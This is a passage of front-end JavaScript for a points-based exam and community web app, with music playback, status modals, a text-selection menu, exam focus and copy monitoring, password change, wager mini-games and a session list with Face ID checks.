    console.log(`🎵 Now playing: ${trackUrl}`);

    sourceNode.onended = () => {
      currentTrackIndex = (currentTrackIndex + 1) % tracks.length;
      playNextTrack(); // 🔁 следующий
    };
  } catch (err) {
    console.error('❌ Failed to play track:', err);
  }
}

// ▶️ Запуск
function playSpecialMusic() {
  if (isMusicPlaying) return;
  if (!audioContext) audioContext = new AudioContext();
  playNextTrack();
}

// ⛔ Остановка
function stopSpecialMusic() {
  if (sourceNode) {
    try {
      sourceNode.onended = null;
      sourceNode.stop();
      sourceNode.disconnect();
    } catch (e) {
      console.warn("⚠️ Already stopped or error:", e);
    }
    sourceNode = null;
  }
  isMusicPlaying = false;
}






const animationCache = {}; // Кеш JSON-данных
let currentAnim = null;

async function showModalStatus(text, type = "success") {
  let modal = document.getElementById('statusModal');
  if (!modal) {
    modal = document.createElement('div');
    modal.id = 'statusModal';
    modal.className = 'status-modal';
    modal.innerHTML = `
      <div class="status-modal-content">
        <div id="statusAnimation" class="lottie-animation"></div>
        <p id="statusText-modal" class="status-text-modal"></p>
        <p id="statusSubText" class="status-subtext"></p>
        <button id="statusOkBtn" class="status-modal-btn">OK</button>
      </div>
    `;
    document.body.appendChild(modal);
  }

  const animationContainer = document.getElementById('statusAnimation');
  const statusText = document.getElementById('statusText-modal');
  const statusSubText = document.getElementById('statusSubText');

  let animationFile = "success.json";
  let subText = "Success";

  if (type === "failed") {
    animationFile = "failed.json";
    subText = "Failed";
  }

  statusText.textContent = text;
  statusSubText.textContent = subText;

  animationContainer.style.width = type === 'failed' ? '200px' : '140px';
  animationContainer.style.height = type === 'failed' ? '200px' : '140px';
  animationContainer.innerHTML = '';

  // Останавливаем текущую анимацию
  if (currentAnim) {
    currentAnim.destroy();
    currentAnim = null;
  }

  // Загружаем JSON только один раз
  let animationData = animationCache[animationFile];
  if (!animationData) {
    try {
      const response = await fetch(`/static/animations/${animationFile}`);
      animationData = await response.json();
      animationCache[animationFile] = animationData; // кешируем
    } catch (error) {
      console.error("Failed to load animation:", error);
      return;
    }
  }

  // Загружаем Lottie из кеша
  currentAnim = lottie.loadAnimation({
    container: animationContainer,
    renderer: 'svg',
    loop: false,
    autoplay: true,
    animationData: animationData
  });

  modal.style.display = 'flex';

  document.getElementById('statusOkBtn').onclick = () => {
    modal.style.display = 'none';
  };
}


// Отключение стандартного контекстного меню
document.addEventListener('contextmenu', function(e) {
    e.preventDefault();
});

// Показ меню при выделении текста
document.addEventListener('mouseup', function(e) {
    setTimeout(() => {
        const selection = window.getSelection();
        const menu = document.getElementById('customMenu');
        if (selection.toString().length > 0 && !selection.isCollapsed) {
            // Adjust position to prevent off-screen placement
            const { adjustedX, adjustedY } = adjustMenuPosition(e.pageX, e.pageY, menu);
            showCustomMenuAboveSelection(adjustedX, adjustedY);
        } else {
            hideCustomMenu();
        }
    }, 10);
});

// Показ кастомного меню над выделенным текстом
function showCustomMenuAboveSelection() {
    const selection = window.getSelection();
    if (selection.rangeCount === 0 || selection.isCollapsed) return;

    const range = selection.getRangeAt(0);
    const rect = range.getBoundingClientRect();

    const menu = document.getElementById('customMenu');

    // Сначала показать меню, чтобы корректно измерить размеры
    menu.style.display = 'block';
    menu.style.opacity = '0';

    // Получаем размеры меню
    const menuWidth = menu.offsetWidth;
    const menuHeight = menu.offsetHeight;

    // Вычисляем координаты появления (по центру выделения, над ним)
    let x = rect.left + (rect.width / 2) - (menuWidth / 2);
    let y = rect.top - menuHeight - 8; // на 8px выше выделения

    // Учесть прокрутку страницы
    x += window.scrollX;
    y += window.scrollY;

    // Регулируем координаты, чтобы не выйти за границы
    const adjusted = adjustMenuPosition(x, y, menu);

    menu.style.left = adjusted.adjustedX + 'px';
    menu.style.top = adjusted.adjustedY + 'px';

    // Плавное появление
    setTimeout(() => {
        menu.style.opacity = '1';
    }, 10);
}

// Скрытие меню с анимацией
function hideCustomMenu() {
    const menu = document.getElementById('customMenu');
    if (menu.style.display !== 'block') return;
    menu.style.opacity = '0';
    setTimeout(() => {
        menu.style.display = 'none';
    }, 200);
}

// Коррекция позиции (не выходить за экран)
function adjustMenuPosition(x, y, menu) {
    const menuWidth = menu.offsetWidth;
    const menuHeight = menu.offsetHeight;
    const windowWidth = window.innerWidth;
    const windowHeight = window.innerHeight;

    let adjustedX = x;
    let adjustedY = y;

    if (x + menuWidth > windowWidth - 10) {
        adjustedX = windowWidth - menuWidth - 10;
    }
    if (x < 10) {
        adjustedX = 10;
    }
    if (y + menuHeight > windowHeight - 10) {
        adjustedY = windowHeight - menuHeight - 10;
    }
    if (y < 10) {
        adjustedY = 10;
    }

    return { adjustedX, adjustedY };
}

// Закрытие меню при клике вне или отмене выделения
document.addEventListener('mousedown', function(e) {
    const menu = document.getElementById('customMenu');
    if (!menu.contains(e.target)) {
        hideCustomMenu();
    }
});

// Закрытие по Escape
document.addEventListener('keydown', function(e) {
    if (e.key === 'Escape') {
        hideCustomMenu();
        window.getSelection().removeAllRanges();
    }
});

// Показываем меню при выделении текста (mouseup)
document.addEventListener('mouseup', function() {
    const selection = window.getSelection();
    if (selection.toString().trim().length > 0) {
        showCustomMenuAboveSelection();
    } else {
        hideCustomMenu();
    }
});


    function searchText() {
        console.log('[DEBUG] searchText called');
        const selection = window.getSelection().toString();
        if (selection) {
            const searchUrl = `https://www.google.com/search?q=${encodeURIComponent(selection)}`;
            window.open(searchUrl, '_blank');
        }
    }

    async function copyText() {
        console.log('[DEBUG] copyText called');
        const selection = window.getSelection().toString();
        if (!selection) return;
        try {
            await navigator.clipboard.writeText(selection);
            console.log('Copied with Clipboard API');
        } catch (err) {
            console.warn('Fallback to execCommand…', err);
            const temp = document.createElement('textarea');
            temp.value = selection;
            temp.style.position = 'fixed';
            temp.style.opacity = '0';
            document.body.appendChild(temp);
            temp.select();
            try {
                document.execCommand('copy');
                console.log('Copied with execCommand');
            } catch (err2) {
                console.error('Copy failed:', err2);
            }
            document.body.removeChild(temp);
        }
    }

    async function pasteText() {
        console.log('[DEBUG] pasteText called');
        const active = document.activeElement;
        if (!active || !('value' in active)) return;
        try {
            const text = await navigator.clipboard.readText();
            const start = active.selectionStart;
            const end = active.selectionEnd;
            const before = active.value.slice(0, start);
            const after = active.value.slice(end);
            active.value = before + text + after;
            const pos = start + text.length;
            active.setSelectionRange(pos, pos);
            console.log('Text pasted');
        } catch (err) {
            console.error('Paste error:', err);
        }
    }
	
let updateStatusTimeout = null;
let index = 0;
let fallbackIndex = 0;
let inFallback = false;

const messages = [
  { text: "Javoblaringizni tahlil qilayapmiz", icon: "🧪" },
  { text: "Hozircha yaxshi ketyapsiz", icon: "🚀" },
  { text: "Hmm... qiziqarli natijalar chiqyapti", icon: "👀" },
  { text: "Har bir detalga e’tibor bermoqdamiz", icon: "🧐" },
  { text: "Yakuniy hisob-kitob ketmoqda", icon: "📊" },
  { text: "AI natijalarni yakunlamoqda", icon: "🤖" }
];

const fallbackMessages = [
  {
    text: "Bir oz dam oldik, lekin gaz beramiz!",
    icon: "🔧"
  },
  {
    text: "Voy, negadur tizim sekinlashdi... bu vaqti-vaqti bilan bo‘lib turadi. Iltimos, sabrli bo‘ling!",
    icon: "🐢"
  },
  {
    text: "Sekinlashganimiz rost, ammo to‘xtamadik! Hamma narsa nazoratda ",
    icon: "🛠️"
  }
];


const statusText = document.getElementById("statusText");

function updateStatusText() {
  if (!statusText) return;

  statusText.classList.remove("slide-in");
  statusText.classList.add("slide-out");

  setTimeout(() => {
    let currentMessage;

    if (inFallback) {
      fallbackIndex = (fallbackIndex + 1) % fallbackMessages.length;
      currentMessage = fallbackMessages[fallbackIndex];
      statusText.classList.add("status-fallback");
    } else {
      index++;

      if (index >= messages.length) {
        // Переход в fallback режим
        inFallback = true;
        fallbackIndex = 0;
        currentMessage = fallbackMessages[fallbackIndex];
        statusText.classList.add("status-fallback");
      } else {
        currentMessage = messages[index];
      }
    }

    // Обновление текста и иконки
    statusText.innerHTML = `
      <span class="status-text-inner">${currentMessage.text}</span>
      <span class="status-icon">${currentMessage.icon}</span>
    `;

    statusText.classList.remove("slide-out");
    void statusText.offsetWidth; // Force reflow
    statusText.classList.add("slide-in");

    const delay = inFallback || index >= messages.length - 2 ? 5000 : 2000;
    updateStatusTimeout = setTimeout(updateStatusText, delay);
  }, 400);
}

function startUpdateStatusText() {
  if (!statusText) return;

  // Сброс состояний
  clearTimeout(updateStatusTimeout);
  index = 0;
  fallbackIndex = 0;
  inFallback = false;
  statusText.classList.remove("status-fallback");

  const firstMessage = messages[index];
  statusText.innerHTML = `
    <span class="status-text-inner">${firstMessage.text}</span>
    <span class="status-icon">${firstMessage.icon}</span>
  `;
  statusText.classList.add("slide-in");

  updateStatusTimeout = setTimeout(updateStatusText, 2000);
}

function stopUpdateStatusText() {
  clearTimeout(updateStatusTimeout);
  updateStatusTimeout = null;
  index = 0;
  fallbackIndex = 0;
  inFallback = false;

  if (statusText) {
    statusText.classList.remove("status-fallback");
  }
}

  async function submitTransfer() {
    const sender = currentUser;
    const receiver = document.getElementById("receiver").value.trim();
    const amount = parseFloat(document.getElementById("amount").value);

    if (!receiver || isNaN(amount) || amount <= 0) {
      showModalStatus("Please enter a valid receiver and a positive amount.", "failed");
      return;
    }

    try {
      const response = await fetch("/api/transfer", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sender, receiver, amount })
      });

      const result = await response.json();

      if (response.ok) {
        showModalStatus(` ${amount} points sent to ${receiver}`, "success");
        document.getElementById("receiver").value = "";
        document.getElementById("amount").value = "";
      } else {
        showModalStatus(` ${result.error || "Something went wrong."}`, "failed");
      }
    } catch (err) {
      showModalStatus("Network error. Please try again later.", "failed");
    }
  }
  
const carouselItems = document.querySelectorAll('.carousel-item');
let currentIndex = 0;
const totalItems = carouselItems.length;

function showNextItem() {
  const current = carouselItems[currentIndex];
  const nextIndex = (currentIndex + 1) % totalItems;
  const next = carouselItems[nextIndex];

  current.classList.add('exiting');
  next.classList.add('active');

  setTimeout(() => {
    current.classList.remove('active', 'exiting');
    currentIndex = nextIndex;
  }, 600); // Совпадает с CSS transition
}

setInterval(showNextItem, 3000);
carouselItems[currentIndex].classList.add('active');

const carousel = document.querySelector('.carousel');
let startX = 0;
let endX = 0;

carousel.addEventListener('touchstart', (e) => {
  startX = e.touches[0].clientX;
});

carousel.addEventListener('touchmove', (e) => {
  endX = e.touches[0].clientX;
});

carousel.addEventListener('touchend', () => {
  const deltaX = endX - startX;

  if (Math.abs(deltaX) > 50) {
    if (deltaX < 0) {
      showNextItem(); // свайп влево
    } else {
      showPrevItem(); // свайп вправо
    }
  }

  // сброс координат
  startX = 0;
  endX = 0;
});

function showPrevItem() {
  const current = carouselItems[currentIndex];
  const prevIndex = (currentIndex - 1 + totalItems) % totalItems;
  const prev = carouselItems[prevIndex];

  current.classList.add('exiting');
  prev.classList.add('active');

  setTimeout(() => {
    current.classList.remove('active', 'exiting');
    currentIndex = prevIndex;
  }, 600);
}

/*
Event
*/

function initExamSecurity(enable = true) {

    if (enable) {
        document.addEventListener('visibilitychange', handleVisibilityChange);
        window.addEventListener('blur', handleWindowBlur);
        window.addEventListener('focus', handleWindowFocus);
        window.addEventListener('mouseleave', handleMouseLeave);
        window.addEventListener('mouseenter', handleMouseEnter);
        document.addEventListener('copy', onCopy);
    } else {
        document.removeEventListener('visibilitychange', handleVisibilityChange);
        window.removeEventListener('blur', handleWindowBlur);
        window.removeEventListener('focus', handleWindowFocus);
        window.removeEventListener('mouseleave', handleMouseLeave);
        window.removeEventListener('mouseenter', handleMouseEnter);
        document.removeEventListener('copy', onCopy);
    }
}

function speak(text, onEnd = null) {
  if (!window.speechSynthesis) {
    console.warn("Speech synthesis not supported.");
    if (onEnd) onEnd(); // fallback
    return;
  }

  const utterance = new SpeechSynthesisUtterance(text);
  utterance.lang = "en-US"; // или "uz-UZ", "ru-RU"
  utterance.rate = 1;
  utterance.pitch = 1;
  utterance.volume = 1;

  if (typeof onEnd === 'function') {
    utterance.onend = onEnd;
  }

  window.speechSynthesis.cancel(); // остановить другие фразы
  window.speechSynthesis.speak(utterance);
}



function handleVisibilityChange() {
    if (document.hidden) {
        showToastNotification("Tab hidden",'info');
    }
}

function handleWindowBlur() {
    // может быть вызван при сворачивании окна
    setTimeout(() => {
        if (!document.hasFocus()) {
            incrementViolation("Window lost focus");
        }
    }, 200);
}

function handleWindowFocus() {
    // Можно использовать для сброса каких-то флагов
}

function handleMouseLeave(event) {
    if (event.clientY <= 0) {
        incrementViolation("Mouse left window (possibly tab switch)");
    }
}

function handleMouseEnter(event) {
    // optional: log return
}

function onCopy(event) {
    event.preventDefault();
    incrementViolation("Copy attempt");
}

function onPaste(event) {
    event.preventDefault();
    incrementViolation("Paste attempt");
}

function onContextMenu(event) {
    event.preventDefault();
    incrementViolation("Right-click attempt");
}

let violationCount = 0;
const maxViolations = 3;

function incrementViolation(reason = "Violation") {
  if (violationCount === 0) {
    showToastNotification(
      `<b>Reminder</b> <span>${username}, please follow the community guidelines and maintain respectful communication. Your cooperation helps keep this space welcoming for everyone.</span>`,
      'warning',
      6000
    );

  } else if (violationCount === 1) {
    showToastNotification(
      `<b>Second Warning</b> <span>${username}, another violation has been detected. Please correct your behavior to avoid further consequences, as repeated violations may result in restrictions.</span>`,
      'warning',
      6000
    );

  }

  violationCount++;

  if (violationCount >= maxViolations) {
    blockUser(currentUser, 900); // временная блокировка на 15 минут
    violationCount = 0; // сброс счётчика
  }
}




document.querySelectorAll('.menu-item').forEach(item => {
  item.addEventListener('click', () => {
    document.querySelectorAll('.menu-item').forEach(i => i.classList.remove('active'));
    item.classList.add('active');
    document.querySelectorAll('.content-section').forEach(section => section.classList.remove('active', 'animate__animated', 'animate__fadeIn'));
    const sectionId = item.getAttribute('data-section');
    if (sectionId) {
      const section = document.getElementById(sectionId);
      section.classList.add('active', 'animate__animated', 'animate__fadeIn');
    }
  });
});

function openLink(url) {
  // Если адрес без http/https — добавим https:// по умолчанию
  if (!/^https?:\/\//i.test(url)) {
    url = "https://" + url;
  }

  // Открываем в новом окне/вкладке
  window.open(url, "_blank", "noopener,noreferrer");
}


function openPasswordModal() {
  document.getElementById('change-passwords-modal').classList.add('active');
}

function closePasswordModal() {
  document.getElementById('change-passwords-modal').classList.remove('active');
  document.getElementById('change-password-form').reset();
  document.getElementById('password-message').textContent = '';
  resetPasswordRequirements();
}

function togglePassword(inputId) {
  const input = document.getElementById(inputId);
  const icon = input.nextElementSibling;
  if (input.type === 'password') {
    input.type = 'text';
    icon.classList.replace('fa-eye', 'fa-eye-slash');
  } else {
    input.type = 'password';
    icon.classList.replace('fa-eye-slash', 'fa-eye');
  }
}

function checkPasswordStrength() {
  const password = document.getElementById('newPassword').value;
  const strengthBar = document.getElementById('strength-bar');
  const strengthText = document.getElementById('strength-text');
  let strengthScore = 0;

  // Check requirements
  document.getElementById('lowercase').children[0].className = password.match(/[a-z]/) ? 'fas fa-check text-green' : 'fas fa-times text-red';
  document.getElementById('uppercase').children[0].className = password.match(/[A-Z]/) ? 'fas fa-check text-green' : 'fas fa-times text-red';
  document.getElementById('number').children[0].className = password.match(/[0-9]/) ? 'fas fa-check text-green' : 'fas fa-times text-red';
  document.getElementById('special').children[0].className = password.match(/[^A-Za-z0-9]/) ? 'fas fa-check text-green' : 'fas fa-times text-red';
  document.getElementById('length').children[0].className = password.length >= 8 ? 'fas fa-check text-green' : 'fas fa-times text-red';

  // Calculate strength
  if (password.match(/[a-z]/)) strengthScore++;
  if (password.match(/[A-Z]/)) strengthScore++;
  if (password.match(/[0-9]/)) strengthScore++;
  if (password.match(/[^A-Za-z0-9]/)) strengthScore++;
  if (password.length >= 8) strengthScore++;

  // Update strength bar and text
  strengthBar.className = 'strength-bar';
  if (strengthScore <= 2) {
    strengthBar.classList.add('weak');
    strengthText.textContent = 'Weak';
  } else if (strengthScore <= 4) {
    strengthBar.classList.add('medium');
    strengthText.textContent = 'Medium';
  } else {
    strengthBar.classList.add('strong');
    strengthText.textContent = 'Strong';
  }
}

function resetPasswordRequirements() {
  const requirements = ['lowercase', 'uppercase', 'number', 'special', 'length'];
  requirements.forEach(id => {
    document.getElementById(id).children[0].className = 'fas fa-times text-red';
  });
  document.getElementById('strength-bar').className = 'strength-bar';
  document.getElementById('strength-text').textContent = '';
}

document.getElementById('change-password-form').addEventListener('submit', async function (e) {
  e.preventDefault();
  const currentPassword = document.getElementById('currentPassword').value;
  const newPassword = document.getElementById('newPassword').value;
  const confirmPassword = document.getElementById('confirmPassword').value;
  const messageEl = document.getElementById('password-message');

  if (newPassword !== confirmPassword) {
    messageEl.style.color = 'var(--danger)';
    messageEl.textContent = 'Passwords do not match.';
    showModalStatus('Passwords do not match.', 'failed');
    return;
  }

  try {
    const res = await fetch('/change_password', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ currentPassword, newPassword })
    });

    const data = await res.json();

    if (res.ok) {
      messageEl.style.color = 'var(--success)';
      messageEl.textContent = data.message;
      showModalStatus(data.message, 'success');
      setTimeout(closePasswordModal, 2000);
    } else {
      messageEl.style.color = 'var(--danger)';
      showModalStatus(data.error, 'failed');
      messageEl.textContent = data.error;
    }
  } catch (error) {
    messageEl.style.color = 'var(--danger)';
    showModalStatus('An error occurred. Please try again.', 'failed');
    messageEl.textContent = 'An error occurred. Please try again.';
  }
});

document.querySelectorAll('.menu-item').forEach(item => {
  item.addEventListener('click', function() {
    document.querySelectorAll('.menu-item').forEach(i => i.classList.remove('active'));
    document.querySelectorAll('.content-section').forEach(c => c.classList.remove('active'));
    this.classList.add('active');
    document.getElementById(this.dataset.section).classList.add('active');
  });
});

  let riskLadderLevel = 0;
    let potentialReward = 0;

    const ladderLevelEl = document.getElementById("ladderLevel");
    const ladderRewardEl = document.getElementById("ladderReward");
    const ladderMessageEl = document.getElementById("ladderMessage");
    const progressFill = document.getElementById("progressFill");
    const particlesEl = document.getElementById("particles");

    const startBtn = document.getElementById("startLadderBtn");
    const nextBtn = document.getElementById("nextLadderBtn");
    const takeBtn = document.getElementById("takeRewardBtn");

    // Sound effects
    const winSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-retro-game-over-213.mp3');
    const loseSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-explosion-2759.mp3');
    const startSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-jump-229.mp3');

    // Update UI
    function updateLadderUI() {
      ladderLevelEl.textContent = riskLadderLevel;
      ladderRewardEl.textContent = potentialReward > 0 ? potentialReward + " pts" : "?";
      progressFill.style.width = `${(riskLadderLevel / 7) * 100}%`;
    }

    // Show message with animation
    function showMessage(msg, success = true) {
      ladderMessageEl.textContent = msg;
      ladderMessageEl.style.color = success ? "#90ee90" : "#ff6666";
      ladderMessageEl.style.animation = "fadeIn 0.5s ease";
      setTimeout(() => ladderMessageEl.style.animation = "", 500);
      createParticles(success);
      if (success) winSound.play();
      else loseSound.play();
    }

    // Create particle effects
    function createParticles(success) {
      for (let i = 0; i < 20; i++) {
        const particle = document.createElement("div");
        particle.className = "particle";
        particle.style.width = `${Math.random() * 5 + 3}px`;
        particle.style.height = particle.style.width;
        particle.style.background = success ? "#ffd700" : "#ff6666";
        particle.style.left = `${Math.random() * 100}%`;
        particle.style.top = `${Math.random() * 100}%`;
        particle.style.setProperty('--x', `${(Math.random() - 0.5) * 200}px`);
        particle.style.setProperty('--y', `${(Math.random() - 0.5) * 200}px`);
        particlesEl.appendChild(particle);
        setTimeout(() => particle.remove(), 1000);
      }
    }

    // Start ladder
    startBtn.addEventListener("click", () => {
      startSound.play();
      fetch('/api/risk_ladder', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username, level: 1 })
      })
      .then(res => res.json())
      .then(data => {
        if (data.result === "success") {
          riskLadderLevel = data.level;
          potentialReward = data.reward;
          updateLadderUI();
          showMessage(data.message);
          startBtn.style.display = "none";
          nextBtn.style.display = "inline-block";
          takeBtn.style.display = "inline-block";
        } else {
          showMessage(data.message, false);
        }
      })
      .catch(err => showMessage("Error: Cosmic interference detected!", false));
    });

    // Next level
    nextBtn.addEventListener("click", () => {
      startSound.play();
      fetch('/api/risk_ladder', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username, level: riskLadderLevel + 1 })
      })
      .then(res => res.json())
      .then(data => {
        if (data.result === "success") {
          riskLadderLevel = data.level;
          potentialReward = data.reward;
          updateLadderUI();
          showMessage(data.message);
          if (riskLadderLevel === 7) {
            nextBtn.style.display = "none";
          }
        } else {
          riskLadderLevel = 0;
          potentialReward = 0;
          updateLadderUI();
          showMessage(data.message, false);
          startBtn.style.display = "inline-block";
          nextBtn.style.display = "none";
          takeBtn.style.display = "none";
        }
      })
      .catch(err => showMessage("Error: Cosmic interference detected!", false));
    });

    // Claim reward
    takeBtn.addEventListener("click", () => {
      if (potentialReward > 0) {
        winSound.play();
        fetch('/api/risk_ladder_take', {
          method: 'POST',
          headers: {'Content-Type': 'application/json'},
          body: JSON.stringify({ username, reward: potentialReward })
        })
        .then(res => res.json())
        .then(data => {
          if (data.success) {
            showMessage(`🎉 Cosmic Treasure Claimed: ${potentialReward} pts`);
          } else {
            showMessage("Error: Treasure lost in the void!", false);
          }
          riskLadderLevel = 0;
          potentialReward = 0;
          updateLadderUI();
          startBtn.style.display = "inline-block";
          nextBtn.style.display = "none";
          takeBtn.style.display = "none";
        })
        .catch(err => showMessage("Error: Cosmic interference during claim!", false));
      }
    });

    updateLadderUI();
	
	let horrorLevel = 0;
let horrorReward = 0;

const horrorLevelEl = document.getElementById("horrorLevel");
const horrorRewardEl = document.getElementById("horrorReward");
const horrorMessageEl = document.getElementById("horrorMessage");
const horrorProgressFill = document.getElementById("horrorProgressFill");
const horrorParticles = document.getElementById("horrorParticles");

const horrorStartBtn = document.getElementById("horrorStartBtn");
const horrorNextBtn = document.getElementById("horrorNextBtn");
const horrorClaimBtn = document.getElementById("horrorClaimBtn");

const horrorWinSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-retro-game-over-213.mp3');
const horrorLoseSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-explosion-2759.mp3');
const horrorStartSound = new Audio('https://assets.mixkit.co/sfx/preview/mixkit-arcade-game-jump-229.mp3');

// 🩸 Начать Horror Games
horrorStartBtn.addEventListener("click", () => {
  horrorStartSound.play();
  fetch("/api/horror_event", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: currentUser, level: 1 })
  })
    .then(res => res.json())
    .then(data => {
      if (data.result === "survived") {
        horrorLevel = data.level;
        horrorReward = data.reward;
        updateHorrorUI(data.message);
        updateHorrorProgress();
        toggleHorrorButtons();
        playParticles(true);
      } else {
        updateHorrorUI(data.error || data.message);
        playParticles(false);
      }
    });
});

// ☠️ Следующий уровень
horrorNextBtn.addEventListener("click", () => {
  horrorStartSound.play();
  fetch("/api/horror_event", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: currentUser, level: horrorLevel + 1 })
  })
    .then(res => res.json())
    .then(data => {
      if (data.result === "survived") {
        horrorLevel = data.level;
        horrorReward = data.reward;
        updateHorrorUI(data.message);
        updateHorrorProgress();
        toggleHorrorButtons();
        playParticles(true);
      } else if (data.result === "screamer") {
        horrorLevel = 0;
        horrorReward = 0;
        updateHorrorProgress();
        toggleHorrorButtons(true);
        updateHorrorUI(data.message);
        triggerScreamerEffect();
        playParticles(false);
      } else {
        updateHorrorUI(data.error || "Something went wrong...");
      }
    });
});

// 🎁 Забрать награду
horrorClaimBtn.addEventListener("click", () => {
  fetch("/api/horror_event_take", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ username: currentUser, reward: horrorReward })
  })
    .then(res => res.json())
    .then(data => {
      if (data.success) {
        updateHorrorUI(`🎁 You escaped with ${horrorReward} pts!`);
        horrorLevel = 0;
        horrorReward = 0;
        updateHorrorProgress();
        toggleHorrorButtons(true);
        horrorWinSound.play();
      } else {
        updateHorrorUI(data.error || "Couldn't claim reward.");
      }
    });
});

// 👁‍🗨 UI и анимации
function updateHorrorUI(message) {
  horrorLevelEl.textContent = horrorLevel || 0;
  horrorRewardEl.textContent = horrorReward || "?";
  horrorMessageEl.textContent = message || "";
}

function updateHorrorProgress() {
  const percent = (horrorLevel / 5) * 100;
  horrorProgressFill.style.width = percent + "%";
}

function toggleHorrorButtons(reset = false) {
  if (reset || horrorLevel === 0) {
    horrorStartBtn.style.display = "inline-block";
    horrorNextBtn.style.display = "none";
    horrorClaimBtn.style.display = "none";
  } else if (horrorLevel < 5) {
    horrorStartBtn.style.display = "none";
    horrorNextBtn.style.display = "inline-block";
    horrorClaimBtn.style.display = "inline-block";
  } else {
    horrorStartBtn.style.display = "none";
    horrorNextBtn.style.display = "none";
    horrorClaimBtn.style.display = "inline-block";
  }
}

function triggerScreamerEffect() {
  const mediaList = [
    "/static/horror/1.jpg"
  ];
  const media = mediaList[Math.floor(Math.random() * mediaList.length)];

  const overlay = document.getElementById("screamerOverlay");
  overlay.innerHTML = ""; // Очищаем прошлый контент

  let element;

  // Отдельно проигрываем скример-звук (всегда)
  const screamAudio = new Audio('/static/horror/screamer-sound.mp3');
  screamAudio.play();

  if (media.endsWith(".mp4") || media.endsWith(".webm")) {
    element = document.createElement("video");
    element.src = media;
    element.autoplay = true;
    element.playsInline = true;
    element.muted = false; // можно сделать true, если autoplay блокируется
    element.onended = () => overlay.style.display = "none";
    element.style.maxHeight = "100%";
    element.style.maxWidth = "100%";
  } else {
    element = document.createElement("img");
    element.src = media;
    setTimeout(() => {
      overlay.style.display = "none";
    }, 3000); // Фото показываем 3 сек
  }

  overlay.appendChild(element);
  overlay.style.display = "flex";
}



function playParticles(success = true) {
  if (!horrorParticles) return;
  for (let i = 0; i < 20; i++) {
    const p = document.createElement("div");
    p.className = "particle";
    const size = `${Math.random() * 4 + 2}px`;
    p.style.width = size;
    p.style.height = size;
    p.style.background = success ? "#66ff66" : "#ff3333";
    p.style.left = `${Math.random() * 100}%`;
    p.style.top = `${Math.random() * 100}%`;
    p.style.setProperty("--x", `${(Math.random() - 0.5) * 200}px`);
    p.style.setProperty("--y", `${(Math.random() - 0.5) * 200}px`);
    horrorParticles.appendChild(p);
    setTimeout(() => p.remove(), 1000);
  }
}

// --- Полный фронтенд-код для работы с Face ID на странице с сессиями ---

function fetchSessions() {
  fetch('/api/sessions/')
    .then(res => res.json())
    .then(data => {
      const sessionsList = document.getElementById('sessions-list');
      sessionsList.innerHTML = '';

      if (!data.sessions || !data.sessions.length) {
        sessionsList.innerHTML = '<p>No active sessions found.</p>';
        isCurrentSessionsPassedFaceID = 'False';
        return;
      }

      let currentSessionPassed = 'False';
      data.sessions.forEach(session => {
        const div = document.createElement('div');
        div.className = 'session-card';
        div.dataset.sessionId = session.sessionId;

        const isCurrent = session.isCurrent;
        const isNew = session.isNew;
        const faceIDDone = !!session.faceID; // boolean

        if (isCurrent && faceIDDone) {
          currentSessionPassed = 'True';
        }

        const currentBadge = isCurrent ? `<span class="badge badge-current">Current Session</span>` : '';
        const newBadge = isNew ? `<span class="badge badge-new">NEW</span>` : '';
        const country = session.country && session.country !== 'Unknown' ? ` (${session.country})` : '';
        const loginTime = session.loginTime || 'Unknown';
        const deviceName = `${session.deviceBrand || 'Device'} - ${session.deviceModel || session.deviceType}`;

        // Terminate button
        const terminateButton = document.createElement('button');
        terminateButton.className = 'terminate-btn' + (isCurrent ? ' disabled' : '');
        terminateButton.innerHTML = `<i class="fas fa-times-circle"></i> Terminate`;

        if (isCurrent) {
          terminateButton.disabled = true;
          terminateButton.title = "Cannot terminate current session";
        } else {
          terminateButton.onclick = () => terminateSession(session.sessionId);
        }

        // Face ID button
        const faceBtn = document.createElement('button');
        faceBtn.className = 'faceid-btn';
        faceBtn.dataset.sessionId = session.sessionId;

        if (faceIDDone) {
          faceBtn.classList.add("done"); // ✅ зелёный
          faceBtn.innerHTML = `<i class="fas fa-check-circle"></i> Face ID Completed`;
          faceBtn.title = "Click to view Face ID photo";
          faceBtn.onclick = () => openFaceIDPhoto(session.sessionId);
        } else {
          faceBtn.classList.add("pending"); // 🟡 ожидание
          faceBtn.innerHTML = `<i class="fas fa-user-check"></i> Complete Face ID Check`;
          faceBtn.onclick = () => startFaceIDFlow(session.sessionId);
        }

        div.innerHTML = `
          <h4>${deviceName} ${currentBadge} ${newBadge}</h4>
          <div class="info">OS: ${session.os}</div>
          <div class="info">Browser: ${session.browser}</div>
          <div class="info">IP: ${session.ipAddress}${country}</div>
          <div class="info">Language: ${session.language}</div>
          <div class="info">Login Time: ${loginTime}</div>
          <div class="info">Session ID: ${session.sessionId}</div>
        `;

        const actions = document.createElement('div');
        actions.className = 'session-actions';
        actions.appendChild(terminateButton);
        actions.appendChild(faceBtn);

        div.appendChild(actions);
        sessionsList.appendChild(div);
      });
      isCurrentSessionsPassedFaceID = currentSessionPassed;
    })
    .catch(err => {
      console.error("Failed to fetch sessions:", err);
      document.getElementById('sessions-list').innerHTML = '<p>Error loading sessions.</p>';
      isCurrentSessionsPassedFaceID = 'False';
    });
}

function openFaceIDPhoto(sessionId) {
  window.open(`/api/sessions/face-id/photo?sessionId=${encodeURIComponent(sessionId)}`, '_blank');
}


/* =========================================================
   Face ID Modal — Liquid Glass + Mobile + DnD/Paste (FULL)
   - Адаптивный дизайн (мобайл-френдли)
   - Font Awesome иконки вместо эмодзи
   - showToastNotification для всех статусов
   - Drag & Drop + Paste + клик по дропзоне
   ========================================================= */
/* -----------------------------
   FaceID JS (startFaceIDFlow, openCameraUI, handleFaceFileSelection)
